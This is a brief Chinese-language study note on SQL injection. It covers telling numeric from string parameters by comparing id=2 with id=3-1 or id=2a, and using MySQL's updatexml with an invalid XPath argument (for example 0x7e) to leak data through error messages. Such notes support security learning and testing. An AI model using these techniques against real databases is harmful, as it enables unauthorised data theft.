# 怎么判断字符型或者数字型？

数字型:id=2 和 id=3-1 返回界面相同
原理：说明 3-1 被解析了，旁边没有引号
字符型:id=2 和 id=2a 页面一样就行
原理：MySQL 等号两边类型不一致会发生强制转换，字符串 -> 数字

group_concat 是用，连接多行记录的函数

# 1.updatexml 函数

updatexml(xml_doument,XPath_string,new_value)
第一个参数：XML 的内容
第二个参数：是需要 update 的位置 XPATH 路径
第三个参数：是更新后的内容
所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合 XPATH 格式，不对就爆出正确内容
可以校验的：0x7e (~),0x5e24 (^$),’#’(#)
